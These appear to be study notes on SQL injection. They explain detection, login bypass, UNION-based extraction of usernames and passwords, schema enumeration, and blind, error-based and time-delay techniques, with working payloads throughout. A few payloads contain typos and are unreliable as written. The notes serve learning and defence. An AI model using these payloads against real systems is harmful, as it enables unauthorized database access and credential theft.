SQLi is a vulnerability which allows an attacker to interfere with queries an app makes to a database. This can allow an attacker to modify or delete data, causing damages to an apps content or behaviour.

# Detecting SQL Injection

SQL injection can be detected manually, typically by submitting:

- A single quote `'` character to look for errors.
- SQL-specific syntax which evaluates to the original value of the entry point and to a different value.
- Boolean conditions like `OR 1=1` and `OR 1=2` to look for differences in app responses.
- Payloads designed to trigger delays when executed in an SQL query.
- OAST payloads designed to trigger an out of band network interaction.

# SQL Injection in Different Parts of the Query

Most SQLi vulnerabilities occur in the `WHERE` clause of a `SELECT` query. However, SQLi vulnerabilities can occur at any location in the query and within different types, such as:

- `UPDATE` statements, within the updated values or the `WHERE` clause.
- `INSERT` statements within the inserted values.
- `SELECT` statements within the table or column name.
- `SELECT` statements within the `ORDER BY` clause.

# Retrieving Hidden Data

In a shopping application, when a user clicks **Gifts**, their browser requests:
`https://insecure-website.com/products?category=Gifts`

This triggers the following SQL query:
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1

The SQL query asks the database to return:

- All details (`*`)
- From the `products` table
- Where the `category` is `Gifts`
- And `released` is `1`

The restriction `released = 1` is used to hide unreleased products. For unreleased products, we can assume `released = 0`. 

When there is no defence against SQLi attacks, the following could be constructed:
`https://insecure-website.com/products?category=Gifts'--`

This triggers the following SQL query:
`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

The `--` is a comment indicator in SQL. Meaning the rest of the query is interpreted as a comment and effectively removed. This means that the query no longer processes `AND released = 1` thereby displaying all products.

Similarly, the following could be used:
`https://insecure-website.com/products?category='Gifts'+OR+1=1--`

This triggers the SQL query:
`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

This returns all items where the `category` is `Gifts` or where `1` is equal to `1` which is always true, therefore, all items are returned.

> [!NOTE] Warning!
> When injecting `OR 1=1` always be cautious, if this condition reaches an `UPDATE` or `DELETE` statement, this could result in a loss of data.

# Subverting Application Logic

In an application where a user logs in with username `wiener` and password `bluecheese`, the application may check the credentials with the following query:
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`

If this query returns a users details, then login succeeds, otherwise, it is rejected. An attacker can login to this without the password by using the SQL comment sequence `--` to remove the password. Submitting the username `administrator'--` and a blank password will process the following query:
`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

This query returns the user whose `username` is `administrator` and successfully logs in.

# SQL Injection UNION Attacks

When an app is vulnerable to SQLi and the results of the query are returned in responses, the `UNION` keyword can be used to retrieve data from other tables within the database. The `UNION` keyword allows one or more additional `SELECT` queries to be executed. For example:
`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

This query returns a single result set with two columns, containing values from columns `a` and `b` in `table1` and colums `c` and `d` in `table2`.

For a `UNION` query to work - two requirements must be met:

1. The individual queries must return the same number of columns.
2. The data types in each column must be compatible between individual queries.

To carry out a SQLi `UNION` attack, make sure these requirements are met, this normally means finding out:

- How many columns are being returned from the original query
- Which columns returned from the original query are of a suitable type to hold the results from the injected query

# Determining the Number of Columns Required

One effective method of determining the number of columns being returned from the original query is the inject a series of `ORDER BY` clauses, incrementing the column count until an error occurs. For example, you could submit:
```
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
```

This series of payloads modifies the original query to order the results by different columns in the result set. When the column index exceeds the number of actual columns, the database returns an error, such as:
`The ORDER BY position number 3 is out of range of the number of items in the seleected list.`

The app may return the error in its HTTP response or issue a generic error response. As long as some difference in response can be determined, you can infer how many columns are being returned.

Another method involves submitting a series of `UNION SELECT` payloads, specifying a different number of null values:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

If the number of nulls does not match the number of columns, the database returns an error like:
`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

`NULL` is used as the value returned because the data types in each column must be compatible between the original & injected queries. `NULL` is convertible to all common data types and so maximises the chance of success. When successful, this should return an additional row in the results, containing null values. This could return an extra row on a HTML table, or trigger a `NullPointerException` or it may not return any different data at all, making this ineffective.

On Oracle, each `SELECT` query must use `FROM`and specify a valid table. In Oracle, there is a built-in table called `DUAL` which can be used for this. This type of query would appear like:
`' UNION SELECT NULL FROM DUAL--`

These payloads use `--` to comment out the remainder of the query. In MySQL, the `--` must be followed by a space, alternatively the hash character `#` can be used as a comment.

# Finding Columns with Useful Data Type

Interesting data is typically in string form, meaning that you need to find one or more columns which have the string data type, or are compatible with it.

After the column count is determined, each column can be probed to test for string data using:
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELET NULL,NULL,NULL,'a'--
```

If a column type receives incompatible string data, it will cause a database error like:
`Conversion failed when converting the varchar 'a' to data type int`

If this error does not occur, and the response contains additional content including the injected value, then the column is suitable for retrieving string data.

# Using SQLi UNION Attack to Retrieve Interesting Info

Once the column count is determined and a suitable column with the correct data type has been identified, interesting information can be retrieved. Suppose that:

- The original query returns two columns, both can hold string data
- The injection point is a quoted string within a `WHERE` clause
- The database contains a table called `users` with the columns `username` and `password`

In this situation, the contents of the `users` table can be retrieved by submitting:
`UNION SELECT username, password FROM users--`

For this to be possible, you would need to know there is a table called `users` with a column for `username` and `password`.

# Retrieving Multiple Values within a Single Column

Multiple values can be retrieved within a single column by concatenating the values together. On Oracle, the following could be submitted:
`' UNION SELECT username || '~' || password FROM users--`

The `||` sequence in Oracle is a string concatenation operator. The injected query concatenates `username` and `password`, separated by the `~` character. The results would appear like:
```
user1~pass1
user2~pass2
user3~pass3
```

Different databases use different syntax for concatenation.

# Examining the Database in SQLi Attacks

To exploit SQLi, it is necessary to find information about the database like:

- The type and version of the database software
- The tables and columns the database contains

# Querying Database Type and Version

One way to identify a database version/type is to attempt to inject a provider specific query like one of the below:

| Database Type    | Query                     |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

For example, you could try a `UNION` attack like:
`' UNION SELECT @@version--`

If successful, the output would confirm the database version.

# Listing the Contents of the Database

Most database types (excluding Oracle) have a set of views known as information schema, this provides info about the database. For example, querying `information_schema.tables` will list the tables in the database:
`SELECT * FROM information_schema.tables`

This will return an output like:
```
TABLE_CATALOG    TABLE_SCHEMA    TABLE_NAME    TABLE_TYPE
=========================================================
MyDatabase       dbo             Products      BASE TABLE
MyDatabase       dbo             Users         BASE TABLE
MyDatabase       dbo             Feedback      BASE TABLE
```

This indicates 3 tables: `Products`, `Users`, and `Feedback`. This can then be used to query `information_schema.columns` to list the columns in each table:
`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

This will return output like:
```
TABLE_CATALOG    TABLE_SCHEMA    TABLE_NAME    COLUMN_NAME    DATA_TYPE
=======================================================================
MyDatabase       dbo             Users         UserId         int
MyDatabase       dbo             Users         Username       varchar
MyDatabase       dbo             Users         Password       varchar
```

# Blind SQLi

Blind SQL injection is when an application is vulnerable but does not return responses to SQL queries in HTTP. Techniques like the `UNION` attack are not effective against blind SQLi as they rely on being able to see the results of a query.

# Exploiting Blind SQLi by Triggering Conditional Responses

In an app where cookies are used to gather analytics, a request may contain a header like:
`Cookie: TrackingId=abcdef`

When a request with a `TrackingId` cookie is made, the app uses a SQL query to determine if its from a known user:
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId='abcdef'`

This query does not return results, but it does behave differently if a recognised `TrackingId` is submitted. A recognised `TrackingId` returns "Welcome back" whilst an unrecognised one does not.

To understand this, consider the following requests containing a `TrackingId`:
```
'abcdef' AND '1'='1
'abcedf' AND '1'='2
```

The first request will return results, because the injected `AND '1'='1` condition is true, therefore, the "Welcome back" message is displayed. The second value returns no results, because the injected condition is false.

For example, there is a table called `Users` with columns `Username` and `Password`. There is a user called `Administrator`. The password can be determined using a series of inputs, testing one character at a time. Start with the following:
`'abcdef' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

This would return "Welcome back", indicating the injected condition is true, meaning the first character of the password is greater than `m`. This can be continued systematically with `> 't` and so on until the password is determined.

# Error Based SQL Injection

Error based SQL injection is when error messages can be used to extract or infer sensitive information from the database. The possibilities depend on the database configuration & type of errors:

- May be able to induce the application to return a specific error based on result of a boolean expression.
- May be able to trigger error messages which return data from the query. This turns blind SQLi into visible SQLi.

Some apps carry out SQL queries and their behaviour doesn't change regardless of the query output. It is possible to induce the application to return a different response if an SQL error occurs. Often, an unhandled error thrown by the databases causes a difference in the apps response. 

For example, take two requests containing `TrackingId`:
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a)
```

These inputs use `CASE` to test a condition and return a different expression based on whether the expression is true:

- In the first input, `CASE` evaluates to `'a'` which does not cause an error.
- In the second input, `CASE` evaluates to `1/0` which causes a divide-by-zero error.

If an error is caused, then the same technique as above can be used to determine if the injected condition is true.

# Extracting Sensitive Data via Verbose SQL Errors

Misconfiguration of a database can result in verbose error messages. For example, the following error occurs after injecting a single quote into an `id` parameter:
`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char.`

This shows the full query being used, making it easier to construct a valid query containing a malicious payload. 

Sometimes, an app can be tricked into generating an error message containing some data returned by the query. `CAST` can be used to achieve this. Consider the following query:
`CAST((SELECT example_col FROM example_table) AS int)`

Attempting to convert a string to an invalid data type like `int` could result in an error like:
`ERROR: Invalid input syntax for type integer: "ExampleData"`

# Exploiting Blind SQLi Using Time Delays

If an app handles database errors gracefully, there won't be any difference in response. In this situation, it is often possible to exploit blind SQLi by triggering a time delay based on a condition being true or false. Delaying the execution of an SQL query will also delay the HTTP response, allowing you to determine if an injected condition is true.

An example of this on Microsoft SQL server is using the following to test a condition and trigger a delay:
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

The first input here will not trigger a delay as the condition is false. The second input will trigger a 10 second delay.

Using this technique, data can be retrieved one character at a time:
`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1 > 'm') = 1 WAITFOR DELAY '0:0:02'--`

